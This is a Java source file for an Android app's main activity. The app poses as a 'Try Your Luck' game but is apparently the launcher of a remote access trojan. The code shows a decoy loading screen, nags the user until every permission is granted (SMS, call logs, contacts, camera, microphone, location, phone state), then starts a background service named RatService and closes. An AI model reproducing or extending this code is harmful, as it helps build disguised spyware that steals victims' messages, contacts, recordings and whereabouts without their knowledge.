package com.my.luck;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.my.luck.core.RatService;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private static final int PERMISSION_REQUEST_CODE = 100;
    private Handler handler = new Handler();
    private boolean permissionsRequested = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Create simple loading screen
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(android.view.Gravity.CENTER);
        layout.setBackgroundColor(0xFF1a1a2e);
        
        TextView textView = new TextView(this);
        textView.setText("♟️ Try Your Luck");
        textView.setTextSize(28);
        textView.setTextColor(0xFFFFFFFF);
        textView.setGravity(android.view.Gravity.CENTER);
        textView.setPadding(0, 0, 0, 20);
        
        ProgressBar progressBar = new ProgressBar(this);
        
        layout.addView(textView);
        layout.addView(progressBar);
        setContentView(layout);

        // Start permission check after a short delay
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                checkAndRequestPermissions();
            }
        }, 500);
    }

    private void checkAndRequestPermissions() {
        List<String> neededPermissions = new ArrayList<>();

        // Add all required permissions
        neededPermissions.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        neededPermissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        neededPermissions.add(Manifest.permission.READ_SMS);
        neededPermissions.add(Manifest.permission.SEND_SMS);
        neededPermissions.add(Manifest.permission.RECEIVE_SMS);
        neededPermissions.add(Manifest.permission.READ_CALL_LOG);
        neededPermissions.add(Manifest.permission.READ_CONTACTS);
        neededPermissions.add(Manifest.permission.CAMERA);
        neededPermissions.add(Manifest.permission.RECORD_AUDIO);
        neededPermissions.add(Manifest.permission.ACCESS_FINE_LOCATION);
        neededPermissions.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        neededPermissions.add(Manifest.permission.READ_PHONE_STATE);
        neededPermissions.add(Manifest.permission.INTERNET);
        neededPermissions.add(Manifest.permission.ACCESS_NETWORK_STATE);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            neededPermissions.add(Manifest.permission.POST_NOTIFICATIONS);
        }

        // Check which permissions are not granted
        List<String> missingPermissions = new ArrayList<>();
        for (String perm : neededPermissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                missingPermissions.add(perm);
            }
        }

        if (missingPermissions.isEmpty()) {
            // All permissions granted - start app
            startApp();
        } else if (!permissionsRequested) {
            // Request missing permissions
            permissionsRequested = true;
            String[] permsArray = missingPermissions.toArray(new String[0]);
            ActivityCompat.requestPermissions(this, permsArray, PERMISSION_REQUEST_CODE);
        } else {
            // Permissions already requested but not granted - show message and retry
            Toast.makeText(this, "Please grant all permissions to continue", Toast.LENGTH_LONG).show();
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    permissionsRequested = false;
                    checkAndRequestPermissions();
                }
            }, 3000);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            // Check if all permissions are granted
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            
            if (allGranted) {
                startApp();
            } else {
                // Some permissions denied - show dialog and retry
                Toast.makeText(this, "All permissions are required!", Toast.LENGTH_LONG).show();
                permissionsRequested = false;
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        checkAndRequestPermissions();
                    }
                }, 2000);
            }
        }
    }

    private void startApp() {
        try {
            // Start the RAT service
            Intent serviceIntent = new Intent(this, RatService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
            
            // Show success message
            Toast.makeText(this, "App started successfully!", Toast.LENGTH_SHORT).show();
            
            // Close the app after starting service
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    finish();
                }
            }, 1000);
            
        } catch (Exception e) {
            e.printStackTrace();
            Toast.makeText(this, "Error: " + e.getMessage(), Toast.LENGTH_LONG).show();
            finish();
        }
    }
}
